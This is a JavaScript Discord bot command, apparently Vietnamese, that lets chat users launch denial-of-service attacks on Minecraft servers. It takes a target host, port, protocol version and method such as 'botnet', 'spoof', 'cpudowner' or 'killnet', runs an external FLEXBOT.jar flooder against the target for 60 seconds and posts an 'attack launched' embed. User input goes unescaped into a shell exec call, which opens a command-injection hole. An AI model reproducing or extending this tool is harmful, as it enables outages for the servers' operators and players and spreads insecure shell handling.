const Discord = require("discord.js");

exports.run = async (client, message, args) => {
const host = message.content.split (" ")[1]
const ip = host?.split(":")[0]
const ports = host?.split(":")[1]
const protocol = message.content.split (" ")[2]
const methods = message.content.split (" ")[3]
const prefix = message.content.split (" ")[4]
const chatbot = args.slice(4).join(" ");
const config = require('../config.json');
var room = config.commandroom;
var version = config.versionbot;
var img = config.img;
var photo = config.photo;
var rolebasic = config.rolebasic;
const test = (methods || '').toLowerCase();
const port = (ports || '25565');
const BannedWords = ["mc2lord.net", "103.74.120.226"]

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	message.reply("Example Command: .attack 1.1.1.1 47 join FLEX_NGU");
	message.react('❌');
	return;
}

if(!args[1]) {
	message.reply("You need use .protocols");
	message.react('❌');
	return;
}

if(!args[2]) {
	message.reply("You need use .methods");
	message.react('❌');
	return;
}

if(test === "spigot" || test === "slowjoin" || test === "flood" || test === "xcord" || test === "auth" || test === "limbo" || test === "byte" || test === "cpu" || test === "tcp" || test === "joinmotd" || test === "bypass" || test === "netty" || test === "join" || test === "motd" || test === "bungee" || test === "net" || test === "game" || test === "ram") {
		
		var chetmemay = test.replace("byte", "byte")
		   .replace("xcord", "botnet")
		   .replace("slowjoin", "chatbot")
		   .replace("flood", "spoof")
		   .replace("cpu", "cpudowner")
		   .replace("joinmotd", "multikiller")
		   .replace("bungee", "ultimatesmasher")
		   .replace("spigot", "spigot")
		   .replace("netty", "nettydowner")
		   .replace("join", "join")
		   .replace("bypass", "bypass")
		   .replace("auth", "yoonikscry")
		   .replace("net", "killnet")
		   .replace("ram", "ram")
		   .replace("game", "game")
		   .replace("tcp", "tcpbypass")
		   .replace("motd", "motd")
		   
	  var miniflex = test.replace("byte", "Byte")
		   .replace("xcord", "XCORD Down")
		   .replace("slowjoin", "Slow Join")
		   .replace("flood", "Flood")
		   .replace("cpu", "CPU")
		   .replace("joinmotd", "Join Motd")
		   .replace("bungee", "Bungee")
		   .replace("spigot", "Spigot")
		   .replace("netty", "Netty")
		   .replace("join", "Join")
		   .replace("bypass", "Bypass")
		   .replace("net", "Internet Down")
		   .replace("ram", "RAM")
		   .replace("game", "GAME")
		   .replace("auth", "Auth Down")
		   .replace("tcp", "TCP")
		   .replace("motd", "MOTD")
		
		if (BannedWords.some(word => message.toString().toLowerCase().includes(word))) {
			message.delete().catch(e => console.error("The message cannot be deleted."));
			message.reply(`The server has been banned.`)
			return;
		}
		
		if(!prefix) {
			const embed1 = new Discord.MessageEmbed()
				.setColor('RANDOM')
				.setTitle(":cloud_lightning: AN ATTACK HAS BEEN LAUNCH!")
				.addFields(
				{ name: ':ghost: Bot Name', value: 'FLEX_NGU', inline: true },
				{ name: ':link: Server', value: host, inline: true },
				{ name: ':lock: Version', value: protocol, inline: true },
				{ name: ':boom: Method', value: miniflex, inline: true },
				{ name: ':rocket: Bot', value: 'Unlimited', inline: true },
				{ name: ':alarm_clock: Duration', value: '60s', inline: true },
				)
				.setFooter('Tiền to thế này thơm là đúng', img)
				.setImage("http://status.mclive.eu/FlexBot/" + ip + "/" + port + "/banner.png")
			if(test === "slowjoin") {
				var exec = require('child_process').exec
					exec(`java -Dperdelay=5000 -Ddelay=1 -Drmnwp=false -jar FLEXBOT.jar ${host} ${protocol} ${chetmemay} 60 500`, (error, stdout, stderr) => {
				});
			} else {
				var exec = require('child_process').exec
					exec(`java -Dperdelay=5000 -Ddelay=1 -Drmnwp=false -jar FLEXBOT.jar ${host} ${protocol} ${chetmemay} 60 -1`, (error, stdout, stderr) => {
				});
			}
			message.channel.send({embeds : [embed1]});
			message.react('✅');
			return;
		} else {
			const embed = new Discord.MessageEmbed()
				.setColor('RANDOM')
				.setTitle(":cloud_lightning: AN ATTACK HAS BEEN LAUNCH!")
				.addFields(
				{ name: ':ghost: Bot Name', value: prefix, inline: true },
				{ name: ':link: Server', value: host, inline: true },
				{ name: ':lock: Version', value: protocol, inline: true },
				{ name: ':boom: Method', value: miniflex, inline: true },
				{ name: ':rocket: Bot', value: 'Unlimited', inline: true },
				{ name: ':alarm_clock: Duration', value: '60s', inline: true },
				)
				.setFooter('Tiền to thế này thơm là đúng', img)
				.setImage("http://status.mclive.eu/FlexBot/" + ip + "/" + port + "/banner.png")
				
			if(test === "slowjoin") {
				var exec = require('child_process').exec
					exec(`prefix=${prefix} java -Dperdelay=5000 -Ddelay=1 -Drmnwp=false -jar FLEXBOT.jar ${host} ${protocol} ${chetmemay} 60 500`, (error, stdout, stderr) => {
				});
			} else {
				var exec = require('child_process').exec
					exec(`prefix=${prefix} java -Dperdelay=5000 -Ddelay=1 -Drmnwp=false -jar FLEXBOT.jar ${host} ${protocol} ${chetmemay} 60 -1`, (error, stdout, stderr) => {
				});
			}
			message.channel.send({embeds : [embed]});
			message.react('✅');
			return;
		}
			
	console.log('Một cuộc tấn công khởi chạy ID Discord:' +  message.guild.id)
	
	} else {
	 message.reply(test + " doesn't exist");
	 message.react('❌');
	 return;
	}
}


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['attack'],
  permLevel: 0
}

exports.help = {
  name: 'attack',
  description: 'Lệnh Tấn Công',
  usage: 'attack'
}